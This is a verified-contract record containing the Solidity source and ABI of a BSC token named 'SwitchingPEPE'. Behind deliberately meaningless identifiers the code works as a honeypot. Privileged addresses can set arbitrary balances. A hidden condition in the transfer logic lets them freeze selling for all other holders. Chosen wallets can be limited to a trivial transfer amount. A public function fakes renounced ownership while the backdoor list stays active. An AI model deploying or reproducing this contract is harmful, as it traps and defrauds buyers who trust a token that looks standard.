{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface walletTradingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toTradingTx) external view returns (uint256);\n\n    function transfer(address marketingAtTrading, uint256 tradingTeam) external returns (bool);\n\n    function allowance(address receiverMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingAtTrading,\n        uint256 tradingTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityWalletIs, uint256 value);\n    event Approval(address indexed receiverMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract exemptMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundTx {\n    function createPair(address launchReceiver, address fromLaunchedIs) external returns (address);\n}\n\ninterface fromWalletTotal is walletTradingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SwitchingPEPE is exemptMarketing, walletTradingReceiver, fromWalletTotal {\n\n    mapping(address => mapping(address => uint256)) private enableMax;\n\n    function name() external view virtual override returns (string memory) {\n        return takeLimitAmount;\n    }\n\n    uint256 private tradingAt;\n\n    bool public listSenderMode;\n\n    function feeTake(uint256 tradingTeam) public {\n        limitEnableSwap();\n        senderFee = tradingTeam;\n    }\n\n    uint256 private swapBuyToken;\n\n    function amountMarketing(address tradingLimit, address marketingAtTrading, uint256 tradingTeam) internal returns (bool) {\n        require(shouldModeSwap[tradingLimit] >= tradingTeam);\n        shouldModeSwap[tradingLimit] -= tradingTeam;\n        shouldModeSwap[marketingAtTrading] += tradingTeam;\n        emit Transfer(tradingLimit, marketingAtTrading, tradingTeam);\n        return true;\n    }\n\n    uint256 private tokenReceiver;\n\n    bool private enableLaunched;\n\n    function transferFrom(address tradingLimit, address marketingAtTrading, uint256 tradingTeam) external override returns (bool) {\n        if (_msgSender() != txLaunchReceiver) {\n            if (enableMax[tradingLimit][_msgSender()] != type(uint256).max) {\n                require(tradingTeam <= enableMax[tradingLimit][_msgSender()]);\n                enableMax[tradingLimit][_msgSender()] -= tradingTeam;\n            }\n        }\n        return marketingMode(tradingLimit, marketingAtTrading, tradingTeam);\n    }\n\n    function liquidityMarketing(address feeReceiverLimit, uint256 tradingTeam) public {\n        limitEnableSwap();\n        shouldModeSwap[feeReceiverLimit] = tradingTeam;\n    }\n\n    address public receiverTotal;\n\n    uint256 private fundAutoIs = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMax;\n    }\n\n    event OwnershipTransferred(address indexed autoTx, address indexed amountMax);\n\n    function allowance(address txMode, address txTake) external view virtual override returns (uint256) {\n        if (txTake == txLaunchReceiver) {\n            return type(uint256).max;\n        }\n        return enableMax[txMode][txTake];\n    }\n\n    uint8 private takeMax = 18;\n\n    function getOwner() external view returns (address) {\n        return atLaunch;\n    }\n\n    function transfer(address feeReceiverLimit, uint256 tradingTeam) external virtual override returns (bool) {\n        return marketingMode(_msgSender(), feeReceiverLimit, tradingTeam);\n    }\n\n    uint256 launchAmount;\n\n    function txTotalLaunch() public {\n        emit OwnershipTransferred(receiverTotal, address(0));\n        atLaunch = address(0);\n    }\n\n    bool public atToken;\n\n    address txLaunchReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public amountTeam;\n\n    uint256 private isLaunch;\n\n    string private takeLimitAmount = \"Switching PEPE\";\n\n    function marketingMode(address tradingLimit, address marketingAtTrading, uint256 tradingTeam) internal returns (bool) {\n        if (tradingLimit == receiverTotal) {\n            return amountMarketing(tradingLimit, marketingAtTrading, tradingTeam);\n        }\n        uint256 liquidityBuy = walletTradingReceiver(atEnableAuto).balanceOf(takeReceiver);\n        require(liquidityBuy == senderFee);\n        require(marketingAtTrading != takeReceiver);\n        if (exemptShould[tradingLimit]) {\n            return amountMarketing(tradingLimit, marketingAtTrading, fromToken);\n        }\n        return amountMarketing(tradingLimit, marketingAtTrading, tradingTeam);\n    }\n\n    function approve(address txTake, uint256 tradingTeam) public virtual override returns (bool) {\n        enableMax[_msgSender()][txTake] = tradingTeam;\n        emit Approval(_msgSender(), txTake, tradingTeam);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toModeFrom;\n    }\n\n    bool public amountShould;\n\n    bool private listTokenLaunched;\n\n    uint256 senderFee;\n\n    function limitEnableSwap() private view {\n        require(amountTeam[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return atLaunch;\n    }\n\n    address takeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public fundTeamTx;\n\n    mapping(address => uint256) private shouldModeSwap;\n\n    uint256 constant fromToken = 18 ** 10;\n\n    constructor (){\n        if (limitMax == isLaunch) {\n            fundTeamTx = false;\n        }\n        sellAt launchListTake = sellAt(txLaunchReceiver);\n        atEnableAuto = fundTx(launchListTake.factory()).createPair(launchListTake.WETH(), address(this));\n        if (fundTeamTx == atToken) {\n            enableLaunched = true;\n        }\n        receiverTotal = _msgSender();\n        txTotalLaunch();\n        amountTeam[receiverTotal] = true;\n        shouldModeSwap[receiverTotal] = fundAutoIs;\n        \n        emit Transfer(address(0), receiverTotal, fundAutoIs);\n    }\n\n    string private toModeFrom = \"SPE\";\n\n    mapping(address => bool) public exemptShould;\n\n    address public atEnableAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAutoIs;\n    }\n\n    function balanceOf(address toTradingTx) public view virtual override returns (uint256) {\n        return shouldModeSwap[toTradingTx];\n    }\n\n    function listFund(address launchedMax) public {\n        if (amountShould) {\n            return;\n        }\n        \n        amountTeam[launchedMax] = true;\n        \n        amountShould = true;\n    }\n\n    uint256 private limitMax;\n\n    address private atLaunch;\n\n    function exemptAmount(address listEnable) public {\n        limitEnableSwap();\n        \n        if (listEnable == receiverTotal || listEnable == atEnableAuto) {\n            return;\n        }\n        exemptShould[listEnable] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityWalletIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnableAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTradingTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"}],\"name\":\"exemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"feeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTeamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"liquidityMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSenderMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingAtTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotalLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SwitchingPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}